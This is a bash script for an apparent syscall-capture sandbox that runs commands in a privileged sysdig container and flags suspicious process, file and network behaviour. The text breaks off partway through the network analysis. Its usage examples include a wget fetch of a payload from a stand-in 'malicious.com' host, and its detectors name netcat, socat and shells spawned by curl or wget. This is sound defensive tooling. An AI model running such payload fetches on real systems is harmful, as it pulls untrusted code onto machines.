#!/bin/bash

set -eo pipefail

# Output colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
DEPLOYMENT_NAME="scapture-deployment"
NAMESPACE="scapture"
CAPTURE_FILE=""
LOCAL_CAPTURE_FILE=""
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCAPS_DIR="$SCRIPT_DIR/scaps"

# Globals
CAPTURE_PID=""
USER_COMMANDS=""
COMMAND_MODE=""
COMMAND_SOURCE=""
AUTO_PACKAGES=""
SKIP_ANALYSIS=false
PLATFORM=""
DOCKER_CONTAINER_NAME="scapture-container"

# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}Cleaning up...${NC}"

    if [[ -n "${CAPTURE_PID:-}" ]]; then
        echo "Stopping any running capture processes..."
        container_exec pkill sysdig 2>/dev/null || true
        wait "$CAPTURE_PID" 2>/dev/null || true
    fi

    # Kill background jobs
    jobs -p | xargs -r kill 2>/dev/null || true
}

# Exit trap
trap cleanup EXIT INT TERM

print_header() {
    echo -e "${BLUE}Enhanced Sysdig Capture & Analysis${NC}"
}

show_usage() {
    echo -e "${BLUE}Usage:${NC}"
    echo "  $0 --command \"your command here\" [--packages \"package1 package2\"]  # Analyze a single command"
    echo "  $0 --script path/to/script.sh [--packages \"package1 package2\"]      # Analyze a script file"
    echo ""
    echo -e "${BLUE}Options:${NC}"
    echo "  --packages \"pkg1 pkg2\"          # Automatically install packages"
    echo "  --no-analysis                   # Skip analysis after capture"
    echo "  --platform kubernetes|docker     # Required: target platform"
    echo ""
    echo -e "${BLUE}Examples:${NC}"
    echo "  $0 --command \"hping3 -1 -c 4 127.0.0.1\" --packages \"hping3\""
    echo "  $0 --command \"wget http://malicious.com/payload.sh\" --packages \"wget\""
    echo "  $0 --script ./test_commands.sh --packages \"nmap netcat\""
    echo "  $0 --platform docker --command \"curl https://example.com\""
}

parse_arguments() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            --command)
                COMMAND_MODE="single"
                USER_COMMANDS="$2"
                shift 2
                ;;
            --script)
                COMMAND_MODE="script"
                COMMAND_SOURCE="$2"
                shift 2
                ;;
            --packages)
                AUTO_PACKAGES="$2"
                shift 2
                ;;
            --no-analysis)
                SKIP_ANALYSIS=true
                shift
                ;;
            --platform)
                PLATFORM="$2"
                case "$PLATFORM" in
                    kubernetes|docker) ;;
                    *)
                        echo -e "${RED}Error: --platform must be 'kubernetes' or 'docker'${NC}"
                        exit 1
                        ;;
                esac
                shift 2
                ;;
            --help|-h)
                show_usage
                exit 0
                ;;
            *)
                echo -e "${RED}Unknown option: $1${NC}"
                show_usage
                exit 1
                ;;
        esac
    done

    if [[ -z "$PLATFORM" ]]; then
        echo -e "${RED}Error: --platform kubernetes|docker is required${NC}"
        show_usage
        exit 1
    fi
}

ensure_scaps_directory() {
    if [[ ! -d "$SCAPS_DIR" ]]; then
        echo -e "${BLUE}Creating scaps directory: scapture/scaps${NC}"
        mkdir -p "$SCAPS_DIR"
    fi
}

# Execute a command inside the sysdig container; pass -i as first arg to attach stdin
container_exec() {
    local stdin_flag=""
    if [[ "${1:-}" == "-i" ]]; then
        stdin_flag="-i"
        shift
    fi
    if [[ "$PLATFORM" == "kubernetes" ]]; then
        kubectl exec $stdin_flag "deployment/$DEPLOYMENT_NAME" -n "$NAMESPACE" -- "$@"
    else
        docker exec $stdin_flag "$DOCKER_CONTAINER_NAME" "$@"
    fi
}

# Copy a file from the container to the local filesystem
container_cp() {
    local src="$1"
    local dst="$2"
    if [[ "$PLATFORM" == "kubernetes" ]]; then
        local pod_name
        pod_name=$(kubectl get pods -l app=sysdig -n "$NAMESPACE" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
        if [[ -z "$pod_name" ]]; then
            return 1
        fi
        kubectl cp "$NAMESPACE/$pod_name:$src" "$dst"
    else
        docker cp "$DOCKER_CONTAINER_NAME:$src" "$dst"
    fi
}

# Tail container logs
container_logs() {
    local lines="${1:-5}"
    if [[ "$PLATFORM" == "kubernetes" ]]; then
        kubectl logs -l app=sysdig -n "$NAMESPACE" --tail="$lines" 2>/dev/null
    else
        docker logs --tail "$lines" "$DOCKER_CONTAINER_NAME" 2>/dev/null
    fi
}

# Inline init script for sysdig installation (same logic as scapture-deployment.yaml)
_sysdig_init_script() {
    cat << 'INIT'
set -e

echo "Installing prerequisites..."
apt-get update -q
apt-get install -y wget curl ca-certificates jq build-essential linux-headers-generic clang llvm

echo "Detecting architecture..."
ARCH=$(uname -m)
echo "Architecture: $ARCH"
case $ARCH in
  x86_64)   SYSDIG_ARCH="x86_64" ;;
  aarch64|arm64) SYSDIG_ARCH="aarch64" ;;
  armv7l)   SYSDIG_ARCH="arm" ;;
  *) echo "Unsupported architecture: $ARCH"; exit 1 ;;
esac

echo "Fetching sysdig version..."
LATEST_RELEASE_URL="https://api.github.com/repos/draios/sysdig/releases/latest"
SYSDIG_VERSION=$(curl -s "$LATEST_RELEASE_URL" | jq -r '.tag_name')

if [ "$SYSDIG_VERSION" = "null" ] || [ -z "$SYSDIG_VERSION" ]; then
  echo "Failed to fetch, using fallback version"
  SYSDIG_VERSION="0.40.1"
fi

echo "Version: $SYSDIG_VERSION"

echo "Checking package availability..."
DOWNLOAD_URL="https://github.com/draios/sysdig/releases/download/${SYSDIG_VERSION}/sysdig-${SYSDIG_VERSION}-${SYSDIG_ARCH}.deb"

if ! wget --spider "$DOWNLOAD_URL" 2>/dev/null; then
  echo "Package not found, checking alternatives..."
  ASSETS=$(curl -s "$LATEST_RELEASE_URL" | jq -r '.assets[].name' | grep '\.deb$')

  if echo "$ASSETS" | grep -q "${SYSDIG_ARCH}\.deb"; then
    PACKAGE_NAME=$(echo "$ASSETS" | grep "${SYSDIG_ARCH}\.deb" | head -n1)
    DOWNLOAD_URL="https://github.com/draios/sysdig/releases/download/${SYSDIG_VERSION}/${PACKAGE_NAME}"
  else
    echo "No compatible package found"
    exit 1
  fi
fi

echo "Downloading sysdig..."
wget -O /tmp/sysdig.deb "$DOWNLOAD_URL"

echo "Installing sysdig..."
dpkg -i /tmp/sysdig.deb || true
apt-get install -f -y

echo "Verifying installation..."
sysdig --version

echo "Warming up BPF probe..."
timeout 10s sysdig --modern-bpf -M 1 'evt.type=execve' >/dev/null 2>&1 || echo "Probe warmup attempted"

echo "Sysdig installation completed successfully"
tail -f /dev/null
INIT
}

# Deploy sysdig pod/container and wait for readiness
wait_for_deployment() {
    echo -e "${YELLOW}Setting up environment...${NC}"

    if [[ "$PLATFORM" == "kubernetes" ]]; then
        if [[ ! -f "scapture-deployment.yaml" ]]; then
            echo -e "${RED}Error: scapture-deployment.yaml not found${NC}"
            exit 1
        fi

        kubectl apply -f scapture-deployment.yaml >/dev/null

        if ! kubectl wait --for=condition=ready pod -l app=sysdig -n "$NAMESPACE" --timeout=300s >/dev/null; then
            echo -e "${RED}Error: Pod not ready${NC}"
            kubectl get pods -l app=sysdig -n "$NAMESPACE"
            exit 1
        fi
    else
        if [[ "$(docker inspect --format='{{.State.Running}}' "$DOCKER_CONTAINER_NAME" 2>/dev/null)" == "true" ]]; then
            echo -e "${GREEN}Reusing existing container${NC}"
            return 0
        fi

        docker rm -f "$DOCKER_CONTAINER_NAME" 2>/dev/null || true

        local init_script
        init_script=$(_sysdig_init_script)

        docker run -d \
            --name "$DOCKER_CONTAINER_NAME" \
            --privileged \
            --pid=host \
            --network=host \
            -v /proc:/proc \
            -v /sys:/sys:ro \
            -v /dev:/dev \
            -v /boot:/boot:ro \
            ubuntu:latest \
            /bin/bash -c "$init_script"
    fi

    echo -e "${GREEN}Container ready${NC}"
}

# Wait for sysdig installation to complete
wait_for_sysdig_ready() {
    echo -e "${YELLOW}Installing sysdig...${NC}"

    local timeout=300
    local elapsed=0
    local interval=5

    while [[ $elapsed -lt $timeout ]]; do
        if container_logs 5 | grep -q "Sysdig installation completed successfully"; then
            echo -e "${GREEN}Sysdig ready${NC}"
            return 0
        fi

        sleep "$interval"
        elapsed=$((elapsed + interval))
    done

    echo -e "${RED}Error: Install timeout${NC}"
    container_logs 20
    exit 1
}

# Enhanced package installation - supports both interactive and automated modes
get_package_requirements() {
    if [[ -n "$AUTO_PACKAGES" ]]; then
        echo -e "\n${GREEN}Installing packages automatically: $AUTO_PACKAGES${NC}"

        local quoted_packages
        quoted_packages=$(printf '%q ' $AUTO_PACKAGES)
        local apt_command="apt-get update -q && apt-get install -y -- ${quoted_packages}"
        echo -e "${BLUE}Executing: ${apt_command}${NC}"

        if container_exec bash -c "
            echo 'Waiting for apt to be available...'
            timeout=60
            elapsed=0
            while fuser /var/lib/dpkg/lock-frontend >/dev/null 2>&1; do
                if [[ \$elapsed -ge \$timeout ]]; then
                    echo 'Timeout waiting for apt lock'
                    exit 1
                fi
                sleep 2
                elapsed=\$((elapsed + 2))
            done
            echo 'Apt available, proceeding...'
            ${apt_command}
        "; then
            echo -e "${GREEN}Packages installed successfully${NC}"
        else
            echo -e "${RED}X Package installation failed${NC}"
            exit 1
        fi
        return
    fi

    echo -e "\n${GREEN}No packages specified, proceeding without additional packages${NC}"
    return
}

prepare_commands() {
    case "$COMMAND_MODE" in
        "single")
            echo -e "\n${BLUE}Command: ${NC}$USER_COMMANDS"
            ;;
        "script")
            if [[ ! -f "$COMMAND_SOURCE" ]]; then
                echo -e "${RED}Error: Script file '$COMMAND_SOURCE' not found${NC}"
                exit 1
            fi
            echo -e "\n${BLUE}Analyzing script file: $COMMAND_SOURCE${NC}"
            USER_COMMANDS=$(cat "$COMMAND_SOURCE")
            echo -e "${BLUE}Script content:${NC}"
            echo "$USER_COMMANDS"
            ;;
        *)
            echo -e "${RED}Error: Must specify --command or --script${NC}"
            show_usage
            exit 1
            ;;
    esac

    if [[ -z "$USER_COMMANDS" ]]; then
        echo -e "${RED}Error: No commands provided${NC}"
        exit 1
    fi

}


# Start system call capture in background
start_capture_background() {
    CAPTURE_FILE="/tmp/scapture-$(date +%Y%m%d-%H%M%S).scap"
    LOCAL_CAPTURE_FILE="$(basename "$CAPTURE_FILE")"
    echo -e "\n${GREEN}Starting capture...${NC}"

    # Focused syscall filter: network, file, process, privilege, and security-relevant ops.
    # Dropped: futex, brk, mmap, munmap, stat, lstat, fstat, nanosleep, epoll_wait, epoll_create,
    #          poll, select, lseek, flock, splice, getpid, getuid/gid family, listxattr, removexattr.
    local filter="evt.type in (open,close,socket,bind,connect,listen,sendto,recvfrom,shutdown,getsockname,getpeername,socketpair,setsockopt,getsockopt,sendmsg,sendmmsg,recvmsg,recvmmsg,creat,pipe,pipe2,eventfd,getcwd,chdir,fchdir,kill,tkill,tgkill,fcntl,ptrace,ioctl,rename,symlink,link,unlink,clone,fork,vfork,getdents,setns,accept,mount,access,chroot,mkdir,rmdir,unshare,execve,execveat,setpgid,openat,chmod,fchmod,chown,fchown,mprotect,dup,dup2,dup3,bpf,mknod,newfstatat,exit,setxattr,setgroups,capget,capset,setuid,setgid,setresuid,setresgid,init_module,finit_module,memfd_create,prctl,umount) and not (proc.name in (sysdig,containerd,k3s-server,containerd-shim,falco,iptables,service,metrics-server,coredns,grpcscanner,lima-guestagent,default-executo,policy-operator,meta-collector,manager,log_proxy,kube-rbac-proxy,workload-operat,traefik,sshd-session.pa,grpc_global_tim,collect2,locale,locale-check) or proc.name contains runc)"

    container_exec bash -c "
        sysdig --modern-bpf -w $CAPTURE_FILE -M 3600 '$filter' &
        echo \$! > /tmp/sysdig.pid
    " &

    CAPTURE_PID=$!

    local wait_secs=0
    while [[ $wait_secs -lt 30 ]]; do
        container_exec test -f /tmp/sysdig.pid 2>/dev/null && break
        sleep 1
        wait_secs=$((wait_secs + 1))
    done

    if ! container_exec test -f /tmp/sysdig.pid 2>/dev/null; then
        echo -e "${RED}Error: Capture failed to start${NC}"
        exit 1
    fi

    # Wait for sysdig to open the capture file — confirms BPF probe is loaded and active
    local scap_wait=0
    while [[ $scap_wait -lt 15 ]]; do
        container_exec test -f "$CAPTURE_FILE" 2>/dev/null && break
        sleep 1
        scap_wait=$((scap_wait + 1))
    done

    if ! container_exec test -f "$CAPTURE_FILE" 2>/dev/null; then
        echo -e "${RED}Error: BPF probe failed to initialize (capture file not created)${NC}"
        exit 1
    fi

    echo -e "${GREEN}Capture running${NC}"
}

# Execute user commands and measure timing
execute_commands_with_timing() {
    echo -e "${GREEN}Executing...${NC}"

    local script_content="#!/bin/bash
set -e
set -o pipefail

$USER_COMMANDS"

    echo "$script_content" | container_exec -i bash -c "
        script_file=\"/tmp/user_\$(date +%s)_\$\$.sh\"
        cat > \"\$script_file\"
        chmod +x \"\$script_file\"
        \"\$script_file\"
        script_exit_code=\$?
        rm -f \"\$script_file\"
        exit \$script_exit_code
    "

    local execution_exit_code=$?

    if [[ $execution_exit_code -eq 0 ]]; then
        echo -e "${GREEN}Commands completed${NC}"
    else
        echo -e "${YELLOW}Commands failed (code: $execution_exit_code)${NC}"
    fi

    return 0
}

# Stop system call capture
stop_capture() {

    container_exec bash -c '
        if [[ -f /tmp/sysdig.pid ]]; then
            SYSDIG_PID=$(cat /tmp/sysdig.pid)
            kill $SYSDIG_PID 2>/dev/null || true
            rm -f /tmp/sysdig.pid
            wait_secs=0
            while kill -0 "$SYSDIG_PID" 2>/dev/null && [[ $wait_secs -lt 15 ]]; do
                sleep 1
                wait_secs=$((wait_secs + 1))
            done
        else
            pkill sysdig 2>/dev/null || true
        fi
    '

    if [[ -n "${CAPTURE_PID:-}" ]]; then
        wait "$CAPTURE_PID" 2>/dev/null || true
        CAPTURE_PID=""
    fi

    echo -e "\n${GREEN}Stopped${NC}"
}

# Verify capture file and copy to local scaps directory
verify_and_copy_capture() {

    if ! container_exec test -f "$CAPTURE_FILE" 2>/dev/null; then
        echo -e "${RED}Error: File not found: $CAPTURE_FILE${NC}"
        container_exec find /tmp -name "*capture*.scap" -ls 2>/dev/null || echo "No capture files found"
        exit 1
    fi

    local file_size
    file_size=$(container_exec stat -c%s "$CAPTURE_FILE" 2>/dev/null)

    if [[ -z "$file_size" ]] || [[ "$file_size" -eq 0 ]]; then
        echo -e "${RED}Error: File is empty${NC}"
        exit 1
    fi

    local local_scap_path="$SCAPS_DIR/$LOCAL_CAPTURE_FILE"

    if container_cp "$CAPTURE_FILE" "$local_scap_path" 2>/dev/null; then
        if [[ -f "$local_scap_path" ]]; then
            local local_size
            local_size=$(stat -c%s "$local_scap_path" 2>/dev/null || stat -f%z "$local_scap_path" 2>/dev/null || echo "0")

            if [[ "$local_size" -gt 0 ]]; then
                echo -e "\n${GREEN}Copied: scaps/$LOCAL_CAPTURE_FILE (${local_size} bytes)${NC}"
                LOCAL_CAPTURE_FILE="scaps/$LOCAL_CAPTURE_FILE"
            else
                echo -e "${RED}Error: Local file is empty${NC}"
                rm -f "$local_scap_path"
                exit 1
            fi
        else
            echo -e "${RED}Error: Copy failed${NC}"
            exit 1
        fi
    else
        echo -e "${RED}Error: Copy failed${NC}"
        exit 1
    fi
}

show_results() {
    echo -e "\n${GREEN}====================================${NC}"
    echo -e "${GREEN}Command Analysis Complete${NC}"
    echo -e "${GREEN}====================================${NC}"
    echo -e "${BLUE}Capture file: $LOCAL_CAPTURE_FILE${NC}"
    echo -e "${BLUE}Full path: $SCRIPT_DIR/$LOCAL_CAPTURE_FILE${NC}"
    echo -e "${BLUE}Analyzed commands:${NC}"
    echo "$USER_COMMANDS" | sed 's/^/  /'
    echo -e "${GREEN}====================================${NC}"
}


# Advanced Process Behavior Analysis
analyze_process_behavior() {
    echo -e "\n${BLUE}================================================================================${NC}"
    echo -e "${BLUE}PROCESS BEHAVIOR ANALYSIS${NC}"
    echo -e "${BLUE}================================================================================${NC}"

    local temp_process_analysis="/tmp/process_analysis_$$"
    mkdir -p "$temp_process_analysis"

    # 1. PARENT-CHILD RELATIONSHIP TRACKING
    echo -e "${YELLOW}Process Tree Analysis:${NC}"

    # Extract process creation events with full relationship data
    container_exec \
        sysdig -r "$CAPTURE_FILE" \
        "evt.type in (clone,fork,execve)" \
        -p $'%evt.rawtime\t%proc.pid\t%proc.ppid\t%proc.name\t%evt.type\t%proc.cmdline\t%proc.aname[0]\t%proc.aname[1]' \
        2>/dev/null > "$temp_process_analysis/process_events.csv" || {
        echo -e "${RED}  Error: Failed to extract process events${NC}"
        rm -rf "$temp_process_analysis"
        return 1
    }

    if [[ ! -s "$temp_process_analysis/process_events.csv" ]]; then
        echo -e "${GREEN}  No process creation events captured${NC}"
        rm -rf "$temp_process_analysis"
        return 0
    fi

    # Analyze parent-child relationships
    awk -F'\t' '{
        time = $1
        pid = $2
        ppid = $3
        name = $4
        event_type = $5
        cmdline = $6
        ancestor0 = $7
        ancestor1 = $8

        # Store process information
        if (event_type == "execve") {
            proc_info[pid] = name
            proc_cmdline[pid] = cmdline
            proc_parent[pid] = ppid

            # Track suspicious parent-child combinations
            if (ppid in proc_info) {
                parent_name = proc_info[ppid]

                # Flag suspicious spawning patterns
                if (parent_name ~ /(curl|wget|python|perl|ruby)/ && name ~ /(sh|bash|dash)/) {
                    print "SUSPICIOUS_SPAWN:" time ":" parent_name "(" ppid ") spawned " name "(" pid ")"
                }

                if (parent_name ~ /(sh|bash)/ && name ~ /(nc|nmap|netcat|socat)/) {
                    print "NETWORK_TOOL_SPAWN:" time ":" parent_name " spawned " name " - " cmdline
                }

                if (name ~ /(python|perl|ruby)/ && cmdline ~ /(-c|-e)/) {
                    print "SCRIPT_EXECUTION:" time ":" name " executing inline script from " parent_name
                }
            }

            # Track rapid process spawning
            spawn_count[ppid]++
            if (spawn_count[ppid] > 3) {
                spawn_times[ppid] = spawn_times[ppid] time ","
            }

            # Detect deep process chains
            chain_depth = 0
            if (ancestor0 != "") chain_depth++
            if (ancestor1 != "") chain_depth++
            if (chain_depth > 2) {
                print "DEEP_CHAIN:" time ":" ancestor1 " -> " ancestor0 " -> " name " (depth:" chain_depth ")"
            }
        }
    } END {
        # Check for rapid spawning patterns
        for (parent_pid in spawn_count) {
            if (spawn_count[parent_pid] > 3) {
                split(spawn_times[parent_pid], times, ",")
                time_span = times[length(times)-1] - times[1]
                if (time_span < 5.0) {  # Less than 5 seconds
                    print "RAPID_SPAWN:" proc_info[parent_pid] "(" parent_pid ") spawned " spawn_count[parent_pid] " processes in " time_span " seconds"
                }
            }
        }
    }' "$temp_process_analysis/process_events.csv" > "$temp_process_analysis/suspicious_patterns.txt"

    # Display findings
    local suspicious_found=false
    while IFS=':' read -r pattern_type details; do
        case "$pattern_type" in
            "SUSPICIOUS_SPAWN")
                echo -e "  ${RED}Suspicious Process Spawn: ${details}${NC}"
                suspicious_found=true
                ;;
            "NETWORK_TOOL_SPAWN")
                echo -e "  ${RED}Network Tool Execution: ${details}${NC}"
                suspicious_found=true
                ;;
            "SCRIPT_EXECUTION")
                echo -e "  ${YELLOW}Inline Script Execution: ${details}${NC}"
                suspicious_found=true
                ;;
            "DEEP_CHAIN")
                echo -e "  ${YELLOW}Deep Process Chain: ${details}${NC}"
                suspicious_found=true
                ;;
            "RAPID_SPAWN")
                echo -e "  ${RED}Rapid Process Spawning: ${details}${NC}"
                suspicious_found=true
                ;;
        esac
    done < "$temp_process_analysis/suspicious_patterns.txt"

    if [[ "$suspicious_found" == false ]]; then
        echo -e "  ${GREEN}No suspicious process relationships detected${NC}"
    fi

    # 2. PROCESS EXECUTION TIMELINE
    echo -e "\n${YELLOW}Process Execution Timeline:${NC}"
    awk -F'\t' 'BEGIN {
        print "  Time      | PID   | Parent| Process      | Command"
        print "  ----------|-------|-------|--------------|----------------------------------------"
    } {
        if ($5 == "execve") {
            time = $1
            pid = $2
            ppid = $3
            name = $4
            cmdline = $6

            # Format for display
            if (start_time == "") start_time = time
            rel_time = (time - start_time) / 1e9

            printf "  +%7.2fs | %-5s | %-5s | %-12s | %.50s\n", rel_time, pid, ppid, name, cmdline
        }
    }' "$temp_process_analysis/process_events.csv"

    # 3. PROCESS FAMILY ANALYSIS
    echo -e "\n${YELLOW}Process Family Analysis:${NC}"
    awk -F'\t' '{
        if ($5 == "execve") {
            name = $4
            cmdline = $6
            family[name]++

            # Track unique command patterns per process family
            if (!(name SUBSEP cmdline in seen_commands)) {
                commands[name] = commands[name] cmdline "\n"
                seen_commands[name SUBSEP cmdline] = 1
            }
        }
    } END {
        print "  Process families and their execution patterns:"
        for (proc_name in family) {
            if (family[proc_name] >= 1) {
                printf "  %s: %d executions\n", proc_name, family[proc_name]

                # Show command variations
                split(commands[proc_name], cmd_list, "\n")
                unique_cmds = 0
                for (i in cmd_list) {
                    if (cmd_list[i] != "") {
                        unique_cmds++
                        if (unique_cmds <= 3) {  # Show max 3 examples
                            printf "     +- %.60s\n", cmd_list[i]
                        }
                    }
                }
                if (unique_cmds > 3) {
                    printf "     +- ... and %d more variations\n", unique_cmds - 3
                }
            }
        }
    }' "$temp_process_analysis/process_events.csv"

    # Cleanup
    rm -rf "$temp_process_analysis"

    echo -e "${BLUE}================================================================================${NC}"
}

# File System Analysis (focused on file operations only)
perform_file_analysis() {
    echo -e "\n${BLUE}================================================================================${NC}"
    echo -e "${BLUE}FILE SYSTEM ANALYSIS${NC}"
    echo -e "${BLUE}================================================================================${NC}"

    # Files created
    echo -e "${YELLOW}Files Created:${NC}"
    local created_files
    created_files=$(container_exec sysdig -r "$CAPTURE_FILE" "evt.type=openat and evt.arg.flags contains O_CREAT" -p "%fd.name" 2>/dev/null | grep -v "^$" | grep -v "/proc/" | grep -v "/dev/" | sort | uniq)

    if [[ -n "$created_files" ]]; then
        echo "$created_files" | while read -r file; do
            echo "  $file"
        done

        # Count and categorize
        local temp_count
        temp_count=$(echo "$created_files" | wc -l | tr -d ' ')
        local shared_libs
        shared_libs=$(echo "$created_files" | grep -c "\.so" 2>/dev/null || true)
        local scripts
        scripts=$(echo "$created_files" | grep -cE "\.(sh|py|pl|rb)$" 2>/dev/null || true)
        local temp_files
        temp_files=$(echo "$created_files" | grep -c "/tmp/" 2>/dev/null || true)

        echo -e "\n  Summary: $temp_count files created"
        [[ $shared_libs -gt 0 ]] && echo -e "    Shared libraries: $shared_libs"
        [[ $scripts -gt 0 ]] && echo -e "    Scripts: $scripts"
        [[ $temp_files -gt 0 ]] && echo -e "    Temp files: $temp_files"
    else
        echo -e "  ${GREEN}No files created${NC}"
    fi

    # Files accessed (most frequently accessed)
    echo -e "\n${YELLOW}Most Accessed Files (top 30):${NC}"
    container_exec sysdig -r "$CAPTURE_FILE" "evt.type=openat and evt.arg.flags contains O_RDONLY" -p "%fd.name" 2>/dev/null | \
        grep -v "^$" | grep -v "/proc/" | grep -v "/dev/" | \
        grep -Ev "^(/var/run/docker/|/etc/ld\.so\.cache)" | \
        sort | uniq -c | sort -nr | head -30 | \
        while read -r count file; do
            printf "  %3d x %s\n" "$count" "$file"
        done || echo -e "  ${YELLOW}No file access data available${NC}"

    echo -e "${BLUE}================================================================================${NC}"
}

# Enhanced Network Analysis with Protocol Classification
perform_enhanced_network_analysis() {
    echo -e "\n${BLUE}================================================================================${NC}"
    echo -e "${BLUE}ENHANCED NETWORK ANALYSIS${NC}"
    echo -e "${BLUE}================================================================================${NC}"

    local temp_network_analysis="/tmp/network_analysis_$$"
    mkdir -p "$temp_network_analysis"

    # Extract all network events
    echo -e "${YELLOW}Collecting network events...${NC}"
    container_exec \
        sysdig -r "$CAPTURE_FILE" \
        "evt.type in (connect,bind,accept,socket)" \
        -p "%evt.time,%evt.type,%proc.name,%proc.pid,%fd.cip,%fd.cport,%fd.sip,%fd.sport,%proc.cmdline" \
        2>/dev/null > "$temp_network_analysis/network_events.csv" || {
        echo -e "${RED}  Error: Failed to extract network events${NC}"
        rm -rf "$temp_network_analysis"
        return 1
    }

    if [[ ! -s "$temp_network_analysis/network_events.csv" ]]; then
        echo -e "${GREEN}  No network events captured${NC}"
        rm -rf "$temp_network_analysis"
        return 0
    fi

    # 1. PROTOCOL CLASSIFICATION AND RISK ANALYSIS
    echo -e "${YELLOW}Protocol Classification & Risk Analysis:${NC}"
    awk -F',' '{
        time = $1
        event_type = $2
        process = $3
        pid = $4
        local_ip = $5
        local_port = $6
        remote_ip = $7
        remote_port = $8
        cmdline = $9

        if (process == "<NA>") next

        if (event_type == "connect" && remote_port != "") {
            # Protocol classification
            protocol = "Unknown"
            risk = "LOW"
            service = ""

            if (remote_port == 22) { protocol = "SSH"; service = "Secure Shell"; risk = (process != "ssh") ? "MEDIUM" : "LOW" }
            else if (remote_port == 80) { protocol = "HTTP"; service = "Web"; risk = (process ~ /(curl|wget)/) ? "LOW" : "MEDIUM" }
            else if (remote_port == 443) { protocol = "HTTPS"; service = "Secure Web"; risk = (process ~ /(curl|wget)/) ? "LOW" : "MEDIUM" }
            else if (remote_port == 21) { protocol = "FTP"; service = "File Transfer"; risk = "HIGH" }
            else if (remote_port == 23) { protocol = "Telnet"; service = "Terminal"; risk = "HIGH" }
            else if (remote_port == 25) { protocol = "SMTP"; service = "Mail"; risk = "MEDIUM" }
            else if (remote_port == 53) { protocol = "DNS"; service = "Name Resolution"; risk = "LOW" }
            else if (remote_port == 110) { protocol = "POP3"; service = "Mail"; risk = "MEDIUM" }
            else if (remote_port == 143) { protocol = "IMAP"; service = "Mail"; risk = "MEDIUM" }
            else if (remote_port == 993) { protocol = "IMAPS"; service = "Secure Mail"; risk = "LOW" }
            else if (remote_port == 995) { protocol = "POP3S"; service = "Secure Mail"; risk = "LOW" }
            else if (remote_port == 3389) { protocol = "RDP"; service = "Remote Desktop"; risk = "HIGH" }
            else if (remote_port == 445) { protocol = "SMB"; service = "File Sharing"; risk = "MEDIUM" }
            else if (remote_port == 5985 || remote_port == 5986) { protocol = "WinRM"; service = "Windows Remote"; risk = "HIGH" }
            else if (remote_port >= 8000 && remote_port <= 9000) { protocol = "Web-Alt"; service = "Alt Web"; risk = "MEDIUM" }
            else if (remote_port >= 1024) { protocol = "Custom"; service = "Custom Service"; risk = "MEDIUM" }

            # Additional risk factors
            if (process ~ /(nc|netcat|socat)/) risk = "HIGH"
            if (cmdline ~ /(shell|cmd|powershell)/) risk = "HIGH"
            if (remote_ip ~ /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/) internal = "YES"; else internal = "NO"

            # Store connection data
            connections[protocol]++
            risk_levels[risk]++
            processes[process]++

            # Track suspicious patterns
            if (risk == "HIGH" || (risk == "MEDIUM" && process ~ /(nc|nmap|curl)/)) {
                suspicious[process ":" protocol ":" remote_ip ":" remote_port] = time ":" risk ":" cmdline
            }

            # Track external connections (exclude localhost)
            if (internal == "NO" && remote_ip != "127.0.0.1" && remote_ip != "::1") {
                external_connections++
                external_details[external_connections] = time "|" process "|" protocol "|" remote_ip "|" remote_port
            }
        }

        # Track listening services
        if (event_type == "bind" && local_port != "") {
            listening_services[local_port] = process
        }
    } END {
        # Explain what we found in plain English
        total_connections = 0
        for (proto in connections) total_connections += connections[proto]

        if (total_connections > 0) {
            printf "  Network Summary: Found %d network connection(s)\n\n", total_connections

            # Protocol explanation
            print "  Protocols Used:"
            for (proto in connections) {
                explanation = ""
                if (proto == "SSH") explanation = "(Secure Shell - remote access)"
                else if (proto == "HTTP") explanation = "(Web traffic - unencrypted)"
                else if (proto == "HTTPS") explanation = "(Secure web traffic)"
                else if (proto == "DNS") explanation = "(Domain name lookups)"
                else if (proto == "FTP") explanation = "(File transfer)"
                else if (proto == "Custom") explanation = "(Non-standard port/raw sockets)"
                else explanation = "(Unknown protocol)"

                printf "    - %s %s: %d connection(s)\n", proto, explanation, connections[proto]
            }

            # Risk explanation
            print "\n  Security Risk Assessment:"
            high_risk = (risk_levels["HIGH"] > 0) ? risk_levels["HIGH"] : 0
            medium_risk = (risk_levels["MEDIUM"] > 0) ? risk_levels["MEDIUM"] : 0
            low_risk = (risk_levels["LOW"] > 0) ? risk_levels["LOW"] : 0

            if (high_risk > 0) {
                printf "    HIGH RISK: %d connection(s) - Potentially dangerous protocols or suspicious usage\n", high_risk
            }
            if (medium_risk > 0) {
                printf "    MEDIUM RISK: %d connection(s) - Network tools or non-standard protocols\n", medium_risk
            }
            if (low_risk > 0) {
                printf "    LOW RISK: %d connection(s) - Normal, expected network activity\n", low_risk
            }

            # Process activity
            if (length(processes) > 0) {
                print "\n  Network-Active Processes:"
                for (proc in processes) {
                    if (processes[proc] >= 1) {
                        activity_level = ""
                        if (processes[proc] == 1) activity_level = "single connection"
                        else if (processes[proc] <= 5) activity_level = "low activity"
                        else if (processes[proc] <= 20) activity_level = "moderate activity"
                        else activity_level = "high activity"

                        printf "    - %s: %d connections (%s)\n", proc, processes[proc], activity_level
                    }
                }
            }
        } else {
            print "  No network connections detected - Local operations only"
        }

        # Suspicious activity with clear explanations
        if (length(suspicious) > 0) {
            print "\n  SECURITY ALERT - Suspicious Network Activity Detected:"
            for (susp_key in suspicious) {
                split(suspicious[susp_key], details, ":")
                time = details[1]
                risk = details[2]
                cmdline = details[3]

                printf "    %s\n", susp_key
                printf "       Reason: %s risk activity detected\n", risk
                printf "       Command: %.80s\n", cmdline
            }
        }

        # External connections with simple explanations
        if (external_connections > 0) {
            print "\n  External Network Activity:"
            printf "     Warning: %d connection(s) to systems outside this container\n", external_connections

            for (i = 1; i <= external_connections && i <= 5; i++) {
                split(external_details[i], ext_data, "|")
                process = ext_data[2]
                protocol = ext_data[3]
                remote_ip = ext_data[4]
                remote_port = ext_data[5]

                printf "    - %s -> %s:%s (%s)\n", process, remote_ip, remote_port, protocol
            }
            if (external_connections > 5) {
                printf "    ... and %d more external connections\n", external_connections - 5
            }
        } else {
            print "\n  Network Activity: All connections stayed within local system (no external access)"
        }

        # Listening services
        if (length(listening_services) > 0) {
